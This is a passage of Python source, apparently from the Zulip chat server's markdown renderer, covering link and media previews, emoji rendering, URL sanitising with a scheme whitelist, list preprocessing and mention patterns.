self.markdown.image_preview_enabled:\n            return None\n        # Youtube video id extraction regular expression from http://pastebin.com/KyKAFv1s\n        # Slightly modified to support URLs of the form youtu.be/<id>\n        # If it matches, match.group(2) is the video id.\n        schema_re = r'(?:https?://)'\n        host_re = r'(?:youtu\\.be/|(?:\\w+\\.)?youtube(?:-nocookie)?\\.com/)'\n        param_re = r'(?:(?:(?:v|embed)/)|(?:(?:watch(?:_popup)?(?:\\.php)?)?(?:\\?|#!?)(?:.+&)?v=))'\n        id_re = r'([0-9A-Za-z_-]+)'\n        youtube_re = r'^({schema_re}?{host_re}{param_re}?)?{id_re}(?(1).+)?$'\n        youtube_re = youtube_re.format(schema_re=schema_re, host_re=host_re, id_re=id_re, param_re=param_re)\n        match = re.match(youtube_re, url)\n        if match is None:\n            return None\n        return match.group(2)\n\n    def youtube_image(self, url: str) -> Optional[str]:\n        yt_id = self.youtube_id(url)\n\n        if yt_id is not None:\n            return \"https://i.ytimg.com/vi/%s/default.jpg\" % (yt_id,)\n        return None\n\n    def vimeo_id(self, url: str) -> Optional[str]:\n        if not self.markdown.image_preview_enabled:\n            return None\n        #(http|https)?:\\/\\/(www\\.)?vimeo.com\\/(?:channels\\/(?:\\w+\\/)?|groups\\/([^\\/]*)\\/videos\\/|)(\\d+)(?:|\\/\\?)\n        # If it matches, match.group('id') is the video id.\n\n        vimeo_re = r'^((http|https)?:\\/\\/(www\\.)?vimeo.com\\/' + \\\n                   r'(?:channels\\/(?:\\w+\\/)?|groups\\/' + \\\n                   r'([^\\/]*)\\/videos\\/|)(\\d+)(?:|\\/\\?))$'\n        match = re.match(vimeo_re, url)\n        if match is None:\n            return None\n        return match.group(5)\n\n    def vimeo_title(self, extracted_data: Dict[str, Any]) -> Optional[str]:\n        title = extracted_data.get(\"title\")\n        if title is not None:\n            return \"Vimeo - {}\".format(title)\n        return None\n\n    def twitter_text(self, text: str,\n                     urls: List[Dict[str, str]],\n                     user_mentions: List[Dict[str, Any]],\n                     media: List[Dict[str, Any]]) -> Element:\n        \"\"\"\n        Use data from the twitter API to turn links, mentions and media into A\n        tags. Also convert unicode emojis to images.\n\n        This works by using the urls, user_mentions and media data from\n        the twitter API and searching for unicode emojis in the text using\n        `unicode_emoji_regex`.\n\n        The first step is finding the locations of the URLs, mentions, media and\n        emoji in the text. For each match we build a dictionary with type, the start\n        location, end location, the URL to link to, and the text(codepoint and title\n        in case of emojis) to be used in the link(image in case of emojis).\n\n        Next we sort the matches by start location. And for each we add the\n        text from the end of the last link to the start of the current link to\n        the output. The text needs to added to the text attribute of the first\n        node (the P tag) or the tail the last link created.\n\n        Finally we add any remaining text to the last node.\n        \"\"\"\n\n        to_process = []  # type: List[Dict[str, Any]]\n        # Build dicts for URLs\n        for url_data in urls:\n            short_url = url_data[\"url\"]\n            full_url = url_data[\"expanded_url\"]\n            for match in re.finditer(re.escape(short_url), text, re.IGNORECASE):\n                to_process.append({\n                    'type': 'url',\n                    'start': match.start(),\n                    'end': match.end(),\n                    'url': short_url,\n                    'text': full_url,\n                })\n        # Build dicts for mentions\n        for user_mention in user_mentions:\n            screen_name = user_mention['screen_name']\n            mention_string = '@' + screen_name\n            for match in re.finditer(re.escape(mention_string), text, re.IGNORECASE):\n                to_process.append({\n                    'type': 'mention',\n                    'start': match.start(),\n                    'end': match.end(),\n                    'url': 'https://twitter.com/' + urllib.parse.quote(screen_name),\n                    'text': mention_string,\n                })\n        # Build dicts for media\n        for media_item in media:\n            short_url = media_item['url']\n            expanded_url = media_item['expanded_url']\n            for match in re.finditer(re.escape(short_url), text, re.IGNORECASE):\n                to_process.append({\n                    'type': 'media',\n                    'start': match.start(),\n                    'end': match.end(),\n                    'url': short_url,\n                    'text': expanded_url,\n                })\n        # Build dicts for emojis\n        for match in re.finditer(unicode_emoji_regex, text, re.IGNORECASE):\n            orig_syntax = match.group('syntax')\n            codepoint = unicode_emoji_to_codepoint(orig_syntax)\n            if codepoint in codepoint_to_name:\n                display_string = ':' + codepoint_to_name[codepoint] + ':'\n                to_process.append({\n                    'type': 'emoji',\n                    'start': match.start(),\n                    'end': match.end(),\n                    'codepoint': codepoint,\n                    'title': display_string,\n                })\n\n        to_process.sort(key=lambda x: x['start'])\n        p = current_node = markdown.util.etree.Element('p')\n\n        def set_text(text: str) -> None:\n            \"\"\"\n            Helper to set the text or the tail of the current_node\n            \"\"\"\n            if current_node == p:\n                current_node.text = text\n            else:\n                current_node.tail = text\n\n        db_data = self.markdown.zulip_db_data\n        current_index = 0\n        for item in to_process:\n            # The text we want to link starts in already linked text skip it\n            if item['start'] < current_index:\n                continue\n            # Add text from the end of last link to the start of the current\n            # link\n            set_text(text[current_index:item['start']])\n            current_index = item['end']\n            if item['type'] != 'emoji':\n                current_node = elem = url_to_a(db_data, item['url'], item['text'])\n            else:\n                current_node = elem = make_emoji(item['codepoint'], item['title'])\n            p.append(elem)\n\n        # Add any unused text\n        set_text(text[current_index:])\n        return p\n\n    def twitter_link(self, url: str) -> Optional[Element]:\n        tweet_id = get_tweet_id(url)\n\n        if tweet_id is None:\n            return None\n\n        try:\n            res = fetch_tweet_data(tweet_id)\n            if res is None:\n                return None\n            user = res['user']  # type: Dict[str, Any]\n            tweet = markdown.util.etree.Element(\"div\")\n            tweet.set(\"class\", \"twitter-tweet\")\n            img_a = markdown.util.etree.SubElement(tweet, 'a')\n            img_a.set(\"href\", url)\n            img_a.set(\"target\", \"_blank\")\n            profile_img = markdown.util.etree.SubElement(img_a, 'img')\n            profile_img.set('class', 'twitter-avatar')\n            # For some reason, for, e.g. tweet 285072525413724161,\n            # python-twitter does not give us a\n            # profile_image_url_https, but instead puts that URL in\n            # profile_image_url. So use _https if available, but fall\n            # back gracefully.\n            image_url = user.get('profile_image_url_https', user['profile_image_url'])\n            profile_img.set('src', image_url)\n\n            text = html.unescape(res['full_text'])\n            urls = res.get('urls', [])\n            user_mentions = res.get('user_mentions', [])\n            media = res.get('media', [])  # type: List[Dict[str, Any]]\n            p = self.twitter_text(text, urls, user_mentions, media)\n            tweet.append(p)\n\n            span = markdown.util.etree.SubElement(tweet, 'span')\n            span.text = \"- %s (@%s)\" % (user['name'], user['screen_name'])\n\n            # Add image previews\n            for media_item in media:\n                # Only photos have a preview image\n                if media_item['type'] != 'photo':\n                    continue\n\n                # Find the image size that is smaller than\n                # TWITTER_MAX_IMAGE_HEIGHT px tall or the smallest\n                size_name_tuples = list(media_item['sizes'].items())\n                size_name_tuples.sort(reverse=True,\n                                      key=lambda x: x[1]['h'])\n                for size_name, size in size_name_tuples:\n                    if size['h'] < self.TWITTER_MAX_IMAGE_HEIGHT:\n                        break\n\n                media_url = '%s:%s' % (media_item['media_url_https'], size_name)\n                img_div = markdown.util.etree.SubElement(tweet, 'div')\n                img_div.set('class', 'twitter-image')\n                img_a = markdown.util.etree.SubElement(img_div, 'a')\n                img_a.set('href', media_item['url'])\n                img_a.set('target', '_blank')\n                img_a.set('title', media_item['url'])\n                img = markdown.util.etree.SubElement(img_a, 'img')\n                img.set('src', media_url)\n\n            return tweet\n        except Exception:\n            # We put this in its own try-except because it requires external\n            # connectivity. If Twitter flakes out, we don't want to not-render\n            # the entire message; we just want to not show the Twitter preview.\n            bugdown_logger.warning(traceback.format_exc())\n            return None\n\n    def get_url_data(self, e: Element) -> Optional[Tuple[str, str]]:\n        if e.tag == \"a\":\n            if e.text is not None:\n                return (e.get(\"href\"), e.text)\n            return (e.get(\"href\"), e.get(\"href\"))\n        return None\n\n    def handle_image_inlining(self, root: Element, found_url: ResultWithFamily) -> None:\n        grandparent = found_url.family.grandparent\n        parent = found_url.family.parent\n        ahref_element = found_url.family.child\n        (url, text) = found_url.result\n        actual_url = self.get_actual_image_url(url)\n\n        # url != text usually implies a named link, which we opt not to remove\n        url_eq_text = (url == text)\n\n        if parent.tag == 'li':\n            add_a(parent, self.get_actual_image_url(url), url, title=text)\n            if not parent.text and not ahref_element.tail and url_eq_text:\n                parent.remove(ahref_element)\n\n        elif parent.tag == 'p':\n            parent_index = None\n            for index, uncle in enumerate(grandparent.getchildren()):\n                if uncle is parent:\n                    parent_index = index\n                    break\n\n            if parent_index is not None:\n                ins_index = self.find_proper_insertion_index(grandparent, parent, parent_index)\n                add_a(grandparent, actual_url, url, title=text, insertion_index=ins_index)\n\n            else:\n                # We're not inserting after parent, since parent not found.\n                # Append to end of list of grandparent's children as normal\n                add_a(grandparent, actual_url, url, title=text)\n\n            # If link is alone in a paragraph, delete paragraph containing it\n            if (len(parent.getchildren()) == 1 and\n                    (not parent.text or parent.text == \"\\n\") and\n                    not ahref_element.tail and\n                    url_eq_text):\n                grandparent.remove(parent)\n\n        else:\n            # If none of the above criteria match, fall back to old behavior\n            add_a(root, actual_url, url, title=text)\n\n    def find_proper_insertion_index(self, grandparent: Element, parent: Element,\n                                    parent_index_in_grandparent: int) -> int:\n        # If there are several inline images from same paragraph, ensure that\n        # they are in correct (and not opposite) order by inserting after last\n        # inline image from paragraph 'parent'\n\n        uncles = grandparent.getchildren()\n        parent_links = [ele.attrib['href'] for ele in parent.iter(tag=\"a\")]\n        insertion_index = parent_index_in_grandparent\n\n        while True:\n            insertion_index += 1\n            if insertion_index >= len(uncles):\n                return insertion_index\n\n            uncle = uncles[insertion_index]\n            inline_image_classes = ['message_inline_image', 'message_inline_ref']\n            if (\n                uncle.tag != 'div' or\n                'class' not in uncle.keys() or\n                uncle.attrib['class'] not in inline_image_classes\n            ):\n                return insertion_index\n\n            uncle_link = list(uncle.iter(tag=\"a\"))[0].attrib['href']\n            if uncle_link not in parent_links:\n                return insertion_index\n\n    def is_absolute_url(self, url: str) -> bool:\n        return bool(urllib.parse.urlparse(url).netloc)\n\n    def run(self, root: Element) -> None:\n        # Get all URLs from the blob\n        found_urls = walk_tree_with_family(root, self.get_url_data)\n        if len(found_urls) == 0 or len(found_urls) > self.INLINE_PREVIEW_LIMIT_PER_MESSAGE:\n            return\n\n        rendered_tweet_count = 0\n\n        for found_url in found_urls:\n            (url, text) = found_url.result\n            if not self.is_absolute_url(url):\n                if self.is_image(url):\n                    self.handle_image_inlining(root, found_url)\n                # We don't have a strong use case for doing url preview for relative links.\n                continue\n\n            dropbox_image = self.dropbox_image(url)\n            if dropbox_image is not None:\n                class_attr = \"message_inline_ref\"\n                is_image = dropbox_image[\"is_image\"]\n                if is_image:\n                    class_attr = \"message_inline_image\"\n                    # Not making use of title and description of images\n                add_a(root, dropbox_image['image'], url,\n                      title=dropbox_image.get('title', \"\"),\n                      desc=dropbox_image.get('desc', \"\"),\n                      class_attr=class_attr,\n                      already_thumbnailed=True)\n                continue\n            if self.is_image(url):\n                self.handle_image_inlining(root, found_url)\n                continue\n            if get_tweet_id(url) is not None:\n                if rendered_tweet_count >= self.TWITTER_MAX_TO_PREVIEW:\n                    # Only render at most one tweet per message\n                    continue\n                twitter_data = self.twitter_link(url)\n                if twitter_data is None:\n                    # This link is not actually a tweet known to twitter\n                    continue\n                rendered_tweet_count += 1\n                div = markdown.util.etree.SubElement(root, \"div\")\n                div.set(\"class\", \"inline-preview-twitter\")\n                div.insert(0, twitter_data)\n                continue\n            youtube = self.youtube_image(url)\n            if youtube is not None:\n                yt_id = self.youtube_id(url)\n                add_a(root, youtube, url, None, None,\n                      \"youtube-video message_inline_image\",\n                      yt_id, already_thumbnailed=True)\n                continue\n\n            db_data = self.markdown.zulip_db_data\n            if db_data and db_data['sent_by_bot']:\n                continue\n\n            if not self.markdown.url_embed_preview_enabled:\n                continue\n\n            try:\n                extracted_data = link_preview.link_embed_data_from_cache(url)\n            except NotFoundInCache:\n                self.markdown.zulip_message.links_for_preview.add(url)\n                continue\n            if extracted_data:\n                vm_id = self.vimeo_id(url)\n                if vm_id is not None:\n                    vimeo_image = extracted_data.get('image')\n                    vimeo_title = self.vimeo_title(extracted_data)\n                    if vimeo_image is not None:\n                        add_a(root, vimeo_image, url, vimeo_title,\n                              None, \"vimeo-video message_inline_image\", vm_id,\n                              already_thumbnailed=True)\n                    if vimeo_title is not None:\n                        found_url.family.child.text = vimeo_title\n                else:\n                    add_embed(root, url, extracted_data)\n\nclass Avatar(markdown.inlinepatterns.Pattern):\n    def handleMatch(self, match: Match[str]) -> Optional[Element]:\n        img = markdown.util.etree.Element('img')\n        email_address = match.group('email')\n        email = email_address.strip().lower()\n        profile_id = None\n\n        db_data = self.markdown.zulip_db_data\n        if db_data is not None:\n            user_dict = db_data['email_info'].get(email)\n            if user_dict is not None:\n                profile_id = user_dict['id']\n\n        img.set('class', 'message_body_gravatar')\n        img.set('src', '/avatar/{0}?s=30'.format(profile_id or email))\n        img.set('title', email)\n        img.set('alt', email)\n        return img\n\ndef possible_avatar_emails(content: str) -> Set[str]:\n    emails = set()\n    for REGEX in [AVATAR_REGEX, GRAVATAR_REGEX]:\n        matches = re.findall(REGEX, content)\n        for email in matches:\n            if email:\n                emails.add(email)\n\n    return emails\n\npath_to_name_to_codepoint = os.path.join(settings.STATIC_ROOT,\n                                         \"generated\", \"emoji\", \"name_to_codepoint.json\")\nwith open(path_to_name_to_codepoint) as name_to_codepoint_file:\n    name_to_codepoint = ujson.load(name_to_codepoint_file)\n\npath_to_codepoint_to_name = os.path.join(settings.STATIC_ROOT,\n                                         \"generated\", \"emoji\", \"codepoint_to_name.json\")\nwith open(path_to_codepoint_to_name) as codepoint_to_name_file:\n    codepoint_to_name = ujson.load(codepoint_to_name_file)\n\n# All of our emojis(non ZWJ sequences) belong to one of these unicode blocks:\n# \\U0001f100-\\U0001f1ff - Enclosed Alphanumeric Supplement\n# \\U0001f200-\\U0001f2ff - Enclosed Ideographic Supplement\n# \\U0001f300-\\U0001f5ff - Miscellaneous Symbols and Pictographs\n# \\U0001f600-\\U0001f64f - Emoticons (Emoji)\n# \\U0001f680-\\U0001f6ff - Transport and Map Symbols\n# \\U0001f900-\\U0001f9ff - Supplemental Symbols and Pictographs\n# \\u2000-\\u206f         - General Punctuation\n# \\u2300-\\u23ff         - Miscellaneous Technical\n# \\u2400-\\u243f         - Control Pictures\n# \\u2440-\\u245f         - Optical Character Recognition\n# \\u2460-\\u24ff         - Enclosed Alphanumerics\n# \\u2500-\\u257f         - Box Drawing\n# \\u2580-\\u259f         - Block Elements\n# \\u25a0-\\u25ff         - Geometric Shapes\n# \\u2600-\\u26ff         - Miscellaneous Symbols\n# \\u2700-\\u27bf         - Dingbats\n# \\u2900-\\u297f         - Supplemental Arrows-B\n# \\u2b00-\\u2bff         - Miscellaneous Symbols and Arrows\n# \\u3000-\\u303f         - CJK Symbols and Punctuation\n# \\u3200-\\u32ff         - Enclosed CJK Letters and Months\nunicode_emoji_regex = '(?P<syntax>['\\\n    '\\U0001F100-\\U0001F64F'    \\\n    '\\U0001F680-\\U0001F6FF'    \\\n    '\\U0001F900-\\U0001F9FF'    \\\n    '\\u2000-\\u206F'            \\\n    '\\u2300-\\u27BF'            \\\n    '\\u2900-\\u297F'            \\\n    '\\u2B00-\\u2BFF'            \\\n    '\\u3000-\\u303F'            \\\n    '\\u3200-\\u32FF'            \\\n    '])'\n# The equivalent JS regex is \\ud83c[\\udd00-\\udfff]|\\ud83d[\\udc00-\\ude4f]|\\ud83d[\\ude80-\\udeff]|\n# \\ud83e[\\udd00-\\uddff]|[\\u2000-\\u206f]|[\\u2300-\\u27bf]|[\\u2b00-\\u2bff]|[\\u3000-\\u303f]|\n# [\\u3200-\\u32ff]. See below comments for explanation. The JS regex is used by marked.js for\n# frontend unicode emoji processing.\n# The JS regex \\ud83c[\\udd00-\\udfff]|\\ud83d[\\udc00-\\ude4f] represents U0001f100-\\U0001f64f\n# The JS regex \\ud83d[\\ude80-\\udeff] represents \\U0001f680-\\U0001f6ff\n# The JS regex \\ud83e[\\udd00-\\uddff] represents \\U0001f900-\\U0001f9ff\n# The JS regex [\\u2000-\\u206f] represents \\u2000-\\u206f\n# The JS regex [\\u2300-\\u27bf] represents \\u2300-\\u27bf\n# Similarly other JS regexes can be mapped to the respective unicode blocks.\n# For more information, please refer to the following article:\n# http://crocodillon.com/blog/parsing-emoji-unicode-in-javascript\n\ndef make_emoji(codepoint: str, display_string: str) -> Element:\n    # Replace underscore in emoji's title with space\n    title = display_string[1:-1].replace(\"_\", \" \")\n    span = markdown.util.etree.Element('span')\n    span.set('class', 'emoji emoji-%s' % (codepoint,))\n    span.set('title', title)\n    span.set('role', 'img')\n    span.set('aria-label', title)\n    span.text = display_string\n    return span\n\ndef make_realm_emoji(src: str, display_string: str) -> Element:\n    elt = markdown.util.etree.Element('img')\n    elt.set('src', src)\n    elt.set('class', 'emoji')\n    elt.set(\"alt\", display_string)\n    elt.set(\"title\", display_string[1:-1].replace(\"_\", \" \"))\n    return elt\n\ndef unicode_emoji_to_codepoint(unicode_emoji: str) -> str:\n    codepoint = hex(ord(unicode_emoji))[2:]\n    # Unicode codepoints are minimum of length 4, padded\n    # with zeroes if the length is less than zero.\n    while len(codepoint) < 4:\n        codepoint = '0' + codepoint\n    return codepoint\n\nclass EmoticonTranslation(markdown.inlinepatterns.Pattern):\n    \"\"\" Translates emoticons like `:)` into emoji like `:smile:`. \"\"\"\n    def handleMatch(self, match: Match[str]) -> Optional[Element]:\n        db_data = self.markdown.zulip_db_data\n        if db_data is None or not db_data['translate_emoticons']:\n            return None\n\n        emoticon = match.group('emoticon')\n        translated = translate_emoticons(emoticon)\n        name = translated[1:-1]\n        return make_emoji(name_to_codepoint[name], translated)\n\nclass UnicodeEmoji(markdown.inlinepatterns.Pattern):\n    def handleMatch(self, match: Match[str]) -> Optional[Element]:\n        orig_syntax = match.group('syntax')\n        codepoint = unicode_emoji_to_codepoint(orig_syntax)\n        if codepoint in codepoint_to_name:\n            display_string = ':' + codepoint_to_name[codepoint] + ':'\n            return make_emoji(codepoint, display_string)\n        else:\n            return None\n\nclass Emoji(markdown.inlinepatterns.Pattern):\n    def handleMatch(self, match: Match[str]) -> Optional[Element]:\n        orig_syntax = match.group(\"syntax\")\n        name = orig_syntax[1:-1]\n\n        active_realm_emoji = {}  # type: Dict[str, Dict[str, str]]\n        db_data = self.markdown.zulip_db_data\n        if db_data is not None:\n            active_realm_emoji = db_data['active_realm_emoji']\n\n        if self.markdown.zulip_message and name in active_realm_emoji:\n            return make_realm_emoji(active_realm_emoji[name]['source_url'], orig_syntax)\n        elif name == 'zulip':\n            return make_realm_emoji('/static/generated/emoji/images/emoji/unicode/zulip.png', orig_syntax)\n        elif name in name_to_codepoint:\n            return make_emoji(name_to_codepoint[name], orig_syntax)\n        else:\n            return None\n\ndef content_has_emoji_syntax(content: str) -> bool:\n    return re.search(EMOJI_REGEX, content) is not None\n\nclass ModalLink(markdown.inlinepatterns.Pattern):\n    \"\"\"\n    A pattern that allows including in-app modal links in messages.\n    \"\"\"\n\n    def handleMatch(self, match: Match[str]) -> Element:\n        relative_url = match.group('relative_url')\n        text = match.group('text')\n\n        a_tag = markdown.util.etree.Element(\"a\")\n        a_tag.set(\"href\", relative_url)\n        a_tag.set(\"title\", relative_url)\n        a_tag.text = text\n\n        return a_tag\n\nclass Tex(markdown.inlinepatterns.Pattern):\n    def handleMatch(self, match: Match[str]) -> Element:\n        rendered = render_tex(match.group('body'), is_inline=True)\n        if rendered is not None:\n            return etree.fromstring(rendered.encode('utf-8'))\n        else:  # Something went wrong while rendering\n            span = markdown.util.etree.Element('span')\n            span.set('class', 'tex-error')\n            span.text = '$$' + match.group('body') + '$$'\n            return span\n\nupload_title_re = re.compile(\"^(https?://[^/]*)?(/user_uploads/\\\\d+)(/[^/]*)?/[^/]*/(?P<filename>[^/]*)$\")\ndef url_filename(url: str) -> str:\n    \"\"\"Extract the filename if a URL is an uploaded file, or return the original URL\"\"\"\n    match = upload_title_re.match(url)\n    if match:\n        return match.group('filename')\n    else:\n        return url\n\ndef fixup_link(link: markdown.util.etree.Element, target_blank: bool=True) -> None:\n    \"\"\"Set certain attributes we want on every link.\"\"\"\n    if target_blank:\n        link.set('target', '_blank')\n    link.set('title', url_filename(link.get('href')))\n\n\ndef sanitize_url(url: str) -> Optional[str]:\n    \"\"\"\n    Sanitize a url against xss attacks.\n    See the docstring on markdown.inlinepatterns.LinkPattern.sanitize_url.\n    \"\"\"\n    try:\n        parts = urllib.parse.urlparse(url.replace(' ', '%20'))\n        scheme, netloc, path, params, query, fragment = parts\n    except ValueError:\n        # Bad url - so bad it couldn't be parsed.\n        return ''\n\n    # If there is no scheme or netloc and there is a '@' in the path,\n    # treat it as a mailto: and set the appropriate scheme\n    if scheme == '' and netloc == '' and '@' in path:\n        scheme = 'mailto'\n    elif scheme == '' and netloc == '' and len(path) > 0 and path[0] == '/':\n        # Allow domain-relative links\n        return urllib.parse.urlunparse(('', '', path, params, query, fragment))\n    elif (scheme, netloc, path, params, query) == ('', '', '', '', '') and len(fragment) > 0:\n        # Allow fragment links\n        return urllib.parse.urlunparse(('', '', '', '', '', fragment))\n\n    # Zulip modification: If scheme is not specified, assume http://\n    # We re-enter sanitize_url because netloc etc. need to be re-parsed.\n    if not scheme:\n        return sanitize_url('http://' + url)\n\n    locless_schemes = ['mailto', 'news', 'file', 'bitcoin']\n    if netloc == '' and scheme not in locless_schemes:\n        # This fails regardless of anything else.\n        # Return immediately to save additional processing\n        return None\n\n    # Upstream code will accept a URL like javascript://foo because it\n    # appears to have a netloc.  Additionally there are plenty of other\n    # schemes that do weird things like launch external programs.  To be\n    # on the safe side, we whitelist the scheme.\n    if scheme not in ('http', 'https', 'ftp', 'mailto', 'file', 'bitcoin'):\n        return None\n\n    # Upstream code scans path, parameters, and query for colon characters\n    # because\n    #\n    #    some aliases [for javascript:] will appear to urllib.parse to have\n    #    no scheme. On top of that relative links (i.e.: \"foo/bar.html\")\n    #    have no scheme.\n    #\n    # We already converted an empty scheme to http:// above, so we skip\n    # the colon check, which would also forbid a lot of legitimate URLs.\n\n    # Url passes all tests. Return url as-is.\n    return urllib.parse.urlunparse((scheme, netloc, path, params, query, fragment))\n\ndef url_to_a(db_data: Optional[DbData], url: str, text: Optional[str]=None) -> Union[Element, str]:\n    a = markdown.util.etree.Element('a')\n\n    href = sanitize_url(url)\n    target_blank = True\n    if href is None:\n        # Rejected by sanitize_url; render it as plain text.\n        return url\n    if text is None:\n        text = markdown.util.AtomicString(url)\n\n    href = rewrite_local_links_to_relative(db_data, href)\n    target_blank = not href.startswith(\"#narrow\") and not href.startswith('mailto:')\n\n    a.set('href', href)\n    a.text = text\n    fixup_link(a, target_blank)\n    return a\n\nclass CompiledPattern(markdown.inlinepatterns.Pattern):\n    def __init__(self, compiled_re: Pattern, md: markdown.Markdown) -> None:\n        # This is similar to the superclass's small __init__ function,\n        # but we skip the compilation step and let the caller give us\n        # a compiled regex.\n        self.compiled_re = compiled_re\n        self.md = md\n\nclass AutoLink(CompiledPattern):\n    def handleMatch(self, match: Match[str]) -> ElementStringNone:\n        url = match.group('url')\n        db_data = self.markdown.zulip_db_data\n        return url_to_a(db_data, url)\n\nclass UListProcessor(markdown.blockprocessors.UListProcessor):\n    \"\"\" Process unordered list blocks.\n\n        Based on markdown.blockprocessors.UListProcessor, but does not accept\n        '+' or '-' as a bullet character.\"\"\"\n\n    TAG = 'ul'\n    RE = re.compile('^[ ]{0,3}[*][ ]+(.*)')\n\n    def __init__(self, parser: Any) -> None:\n\n        # HACK: Set the tab length to 2 just for the initialization of\n        # this class, so that bulleted lists (and only bulleted lists)\n        # work off 2-space indentation.\n        parser.markdown.tab_length = 2\n        super().__init__(parser)\n        parser.markdown.tab_length = 4\n\nclass ListIndentProcessor(markdown.blockprocessors.ListIndentProcessor):\n    \"\"\" Process unordered list blocks.\n\n        Based on markdown.blockprocessors.ListIndentProcessor, but with 2-space indent\n    \"\"\"\n\n    def __init__(self, parser: Any) -> None:\n\n        # HACK: Set the tab length to 2 just for the initialization of\n        # this class, so that bulleted lists (and only bulleted lists)\n        # work off 2-space indentation.\n        parser.markdown.tab_length = 2\n        super().__init__(parser)\n        parser.markdown.tab_length = 4\n\nclass BlockQuoteProcessor(markdown.blockprocessors.BlockQuoteProcessor):\n    \"\"\" Process BlockQuotes.\n\n        Based on markdown.blockprocessors.BlockQuoteProcessor, but with 2-space indent\n    \"\"\"\n\n    # Original regex for blockquote is RE = re.compile(r'(^|\\n)[ ]{0,3}>[ ]?(.*)')\n    RE = re.compile(r'(^|\\n)(?!(?:[ ]{0,3}>\\s*(?:$|\\n))*(?:$|\\n))'\n                    r'[ ]{0,3}>[ ]?(.*)')\n    mention_re = re.compile(mention.find_mentions)\n\n    def clean(self, line: str) -> str:\n        # Silence all the mentions inside blockquotes\n        line = re.sub(self.mention_re, lambda m: \"@_{}\".format(m.group('match')), line)\n\n        # And then run the upstream processor's code for removing the '>'\n        return super().clean(line)\n\nclass BugdownUListPreprocessor(markdown.preprocessors.Preprocessor):\n    \"\"\" Allows unordered list blocks that come directly after a\n        paragraph to be rendered as an unordered list\n\n        Detects paragraphs that have a matching list item that comes\n        directly after a line of text, and inserts a newline between\n        to satisfy Markdown\"\"\"\n\n    LI_RE = re.compile('^[ ]{0,3}[*][ ]+(.*)', re.MULTILINE)\n    HANGING_ULIST_RE = re.compile('^.+\\\\n([ ]{0,3}[*][ ]+.*)', re.MULTILINE)\n\n    def run(self, lines: List[str]) -> List[str]:\n        \"\"\" Insert a newline between a paragraph and ulist if missing \"\"\"\n        inserts = 0\n        fence = None\n        copy = lines[:]\n        for i in range(len(lines) - 1):\n            # Ignore anything that is inside a fenced code block\n            m = FENCE_RE.match(lines[i])\n            if not fence and m:\n                fence = m.group('fence')\n            elif fence and m and fence == m.group('fence'):\n                fence = None\n\n            # If we're not in a fenced block and we detect an upcoming list\n            #  hanging off a paragraph, add a newline\n            if (not fence and lines[i] and\n                self.LI_RE.match(lines[i+1]) and\n                    not self.LI_RE.match(lines[i])):\n\n                copy.insert(i+inserts+1, '')\n                inserts += 1\n        return copy\n\nclass AutoNumberOListPreprocessor(markdown.preprocessors.Preprocessor):\n    \"\"\" Finds a sequence of lines numbered by the same number\"\"\"\n    RE = re.compile(r'^([ ]*)(\\d+)\\.[ ]+(.*)')\n    TAB_LENGTH = 2\n\n    def run(self, lines: List[str]) -> List[str]:\n        new_lines = []  # type: List[str]\n        current_list = []  # type: List[Match[str]]\n        current_indent = 0\n\n        for line in lines:\n            m = self.RE.match(line)\n\n            # Remember if this line is a continuation of already started list\n            is_next_item = (m and current_list\n                            and current_indent == len(m.group(1)) // self.TAB_LENGTH)\n\n            if not is_next_item:\n                # There is no more items in the list we were processing\n                new_lines.extend(self.renumber(current_list))\n                current_list = []\n\n            if not m:\n                # Ordinary line\n                new_lines.append(line)\n            elif is_next_item:\n                # Another list item\n                current_list.append(m)\n            else:\n                # First list item\n                current_list = [m]\n                current_indent = len(m.group(1)) // self.TAB_LENGTH\n\n        new_lines.extend(self.renumber(current_list))\n\n        return new_lines\n\n    def renumber(self, mlist: List[Match[str]]) -> List[str]:\n        if not mlist:\n            return []\n\n        start_number = int(mlist[0].group(2))\n\n        # Change numbers only if every one is the same\n        change_numbers = True\n        for m in mlist:\n            if int(m.group(2)) != start_number:\n                change_numbers = False\n                break\n\n        lines = []  # type: List[str]\n        counter = start_number\n\n        for m in mlist:\n            number = str(counter) if change_numbers else m.group(2)\n            lines.append('%s%s. %s' % (m.group(1), number, m.group(3)))\n            counter += 1\n\n        return lines\n\n# We need the following since upgrade from py-markdown 2.6.11 to 3.0.1\n# modifies the link handling significantly. The following is taken from\n# py-markdown 2.6.11 markdown/inlinepatterns.py.\n@one_time\ndef get_link_re() -> str:\n    '''\n    Very important--if you need to change this code to depend on\n    any arguments, you must eliminate the \"one_time\" decorator\n    and consider performance implications.  We only want to compute\n    this value once.\n    '''\n\n    NOBRACKET = r'[^\\]\\[]*'\n    BRK = (\n        r'\\[(' +\n        (NOBRACKET + r'(\\[')*6 +\n        (NOBRACKET + r'\\])*')*6 +\n        NOBRACKET + r')\\]'\n    )\n    NOIMG = r'(?<!\\!)'\n\n    # [text](url) or [text](<url>) or [text](url \"title\")\n    LINK_RE = NOIMG + BRK + \\\n        r'''\\(\\s*(<(?:[^<>\\\\]|\\\\.)*>|(\\([^()]*\\)|[^()])*?)\\s*(('(?:[^'\\\\]|\\\\.)*'|\"(?:[^\"\\\\]|\\\\.)*\")\\s*)?\\)'''\n    return normal_compile(LINK_RE)\n\ndef prepare_realm_pattern(source: str) -> str:\n    \"\"\" Augment a realm filter so it only matches after start-of-string,\n    whitespace, or opening delimiters, won't match if there are word\n    characters directly after, and saves what was matched as \"name\". \"\"\"\n    return r\"\"\"(?<![^\\s'\"\\(,:<])(?P<name>\"\"\" + source + r')(?!\\w)'\n\n# Given a regular expression pattern, linkifies groups that match it\n# using the provided format string to construct the URL.\nclass RealmFilterPattern(markdown.inlinepatterns.Pattern):\n    \"\"\" Applied a given realm filter to the input \"\"\"\n\n    def __init__(self, source_pattern: str,\n                 format_string: str,\n                 markdown_instance: Optional[markdown.Markdown]=None) -> None:\n        self.pattern = prepare_realm_pattern(source_pattern)\n        self.format_string = format_string\n        markdown.inlinepatterns.Pattern.__init__(self, self.pattern, markdown_instance)\n\n    def handleMatch(self, m: Match[str]) -> Union[Element, str]:\n        db_data = self.markdown.zulip_db_data\n        return url_to_a(db_data,\n                        self.format_string % m.groupdict(),\n                        m.group(\"name\"))\n\nclass UserMentionPattern(markdown.inlinepatterns.Pattern):\n    def handleMatch(self, m: Match[str]) -> Optional[Element]:\n        match = m.group('match')\n        silent = m.group('silent') == '_'\n\n        db_data = self.markdown.zulip_db_data\n        if self.markdown.zulip_message and db_data is not None:\n            if match.startswith(\"**\") and match.endswith(\"**\"):\n                name = match[2:-2]\n            else:\n                return None\n\n            wildcard = mention.user_mention_matches_wildcard(name)\n\n    